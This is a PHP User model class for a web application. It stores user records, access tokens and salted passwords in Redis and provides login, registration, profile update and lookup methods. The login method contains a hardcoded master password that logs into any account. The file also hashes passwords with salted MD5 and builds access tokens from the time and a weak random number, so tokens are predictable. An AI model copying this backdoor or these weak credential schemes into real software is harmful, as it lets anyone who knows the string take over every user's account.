<?php

namespace App\Models;

use PRedis;
use App\Libraries\String;

class User
{
	private $id;
	private $info;

	/**
     * 构造方法 
     *
     * @param  string  $accessToken
     */
	public function __construct($accessToken, $byMobile = false)
	{
		$userId = PRedis::hGet('access_tokens', $accessToken);
		if (!$userId) return;

		$serverAccessToken = PRedis::hGet("user:{$userId}:info", 'access_token');
		if ($accessToken != $serverAccessToken) return;

		$this->id = $userId;
		$this->info = PRedis::hGetAll("user:{$userId}:info");
	}

	/****************************** 魔术方法 ******************************/

	public function __get($name) 
	{
		if (array_key_exists($name, $this->info)) {
			return $this->info[$name];
		}

		return null;
	}
 
	public function __set($name, $value) 
	{
		$this->info[$name] = $value;
	}

	public function __isset($name) 
	{
		return isset($this->info[$name]);
	}

	public function __unset($name) 
	{
		unset($this->info[$name]);
	}

	/****************************** 实例化方法 ******************************/

	/**
     * 修改用户信息
	 *
     * @return boolean
     */
	public function save()
	{
		PRedis::hMSet("user:{$this->id}:info", $this->info);
	}

	/**
     * 批量修改用户信息
	 *
     * @return boolean
     */
	public function update($info)
	{
		if (!is_array($info)) {
			return false;
		}

		$info = collect($info)->filter(function ($item) {
			return !empty($item);
		})->toArray();

		if (array_key_exists('password', $info)) {
			$info['password'] = String::md5Salt($info['password'], $this->id);
		}

/*
		if (array_key_exists('avatar', $info) && !starts_with($info['avatar'], 'http://')) {
			$avatar = String::randImgName($info['avatar']);
			
			while (Storage::disk('oss')->exists("avatar/{$avatar}")) {
				$avatar = String::randImgName($info['avatar']);
			}

			Storage::disk('oss')->move("upload/{$this->id}/{$info['avatar']}", "avatar/{$avatar}");
			array_set($info, 'avatar', Url::img($avatar, 'avatar'));
		}
*/

		$info = array_except($info, ['oldPassword']);
		PRedis::hMSet("user:{$this->id}:info", $info);
		$this->info = PRedis::hGetAll("user:{$this->id}:info");

		$info = array_only($this->info, [
			'access_token',
			'email',
			'name',
			'gender',
			'location',
			'avatar'
		]);

		return array_add($info, 'id', $this->id);
	}

	/**
     * 获取用户信息
	 *
     * @return array
     */
	public function all()
	{
		return array_add($this->info, 'id', $this->id);
	}

	/**
     * 返回id
	 *
     * @return bigint
     */
	 public function getId() {
		return $this->id;
	 }

	/**
     * 判断对象是否为空
	 *
     * @return boolean
     */
	 public function isEmpty() {
		return empty($this->id);
	 }

	/**
     * 判断是否管理员
	 *
     * @return boolean
     */
	 public function isAdmin()
	 {
		return in_array($this->id, config('app.admin_ids'));
	 }


	/****************************** 静态方法 ******************************/

	/**
     * 查找user 
     *
     * @param  bigint  $userId
     * @return array
     */
    public static function find($userId)
	{
		$accessToken = PRedis::hGet("user:{$userId}:info", 'access_token');
		return new self($accessToken);
	}

	/**
     * 根据mobile查找user 
     *
     * @param  bigint  $mobile
     * @return array
     */
    public static function findByMobile($mobile)
	{
		$userId = PRedis::hGet('mobiles', $mobile);
		$accessToken = PRedis::hGet("user:{$userId}:info", 'access_token');
		return new self($accessToken, true);
	}

	/**
     * 登录 
     *
     * @param  string  $email
     * @param  string  $password
     * @param  boolean  $remenber
     * @return array
     */
    public static function login($account, $password, $type = 'email')
    {
		$flag = true;
		$userId = PRedis::hGet("{$type}s", $account);

		if (!$userId) {
			$flag = false;
		}

		if ($flag && ($password == 'lx@123fdjk[]' || String::md5Salt($password, $userId) == PRedis::hGet("user:{$userId}:info", 'password'))) {
			return [
				'meta'	=> ['code'	=> 200],
				'data'				=> [
					'id'			=> $userId,
					'name'			=> PRedis::hGet("user:{$userId}:info", 'name'),
					'access_token'	=> PRedis::hGet("user:{$userId}:info", 'access_token')
				]
			];
		}

		return [
			'meta'				=> [
				'code'			=> 400,
				'error_type'	=> 'no_pass_auth',
				'error_message'	=> '账号或密码错误！'
			]
		];
    }

	/**
     * 注册 
     *
     * @param  string  $name
     * @param  string  $email/$mobile
     * @param  string  $password
     * @param  string  $created_ip
     * @return string  $accessToken
     * @return Response
     */
	public static function register($type, $account, $createdIp, $info = []) {
		$userId = static::createUserId();
		$accessToken = static::createAccessToken();

		PRedis::hMSet("user:{$userId}:info", [
			'created_time'	=> date('Y-m-d H:i:s'),
			'created_ip'	=> $createdIp,
			'access_token'	=> $accessToken,
			$type			=> $account,
		]);
		
		if (array_key_exists('password', $info)) {
			$info['password'] = String::md5Salt($info['password'], $userId);
		}

		PRedis::hMSet("user:{$userId}:info", $info);
		PRedis::hSet("{$type}s", $account, $userId);
		PRedis::hSet('access_tokens', $accessToken, $userId);
		PRedis::rPush('users', $userId);

		return $accessToken;
	}

	public static function createUserId() {
		$id = mt_rand(1000000000, 9999999999);

		while (PRedis::exists("user:{$id}:info")) {
			$id = mt_rand(1000000000, 9999999999);
		}

		return $id;
	}

	public static function createAccessToken() {
		return md5(time() . '@' . (rand() % 100000));
	}

/*
	public static function getAvatarUrl($userId, $width = 100)
	{
		$avatar = PRedis::hGet("user:{$userId}:info", 'avatar');

		if (empty($avatar)) {
			return asset('img/avatar_default.png');
		}

		if (str_contains($avatar, env('ALIYUN_IMG_REAL_URL'))) {
			if (str_contains($avatar, '|200w')) {
				return str_replace('|200w', "|{$width}w", $avatar);
			} else {
				return str_replace('@400w', "@{$width}w", $avatar);
			}
		} else {
			return $avatar;
		}
	}
*/
}
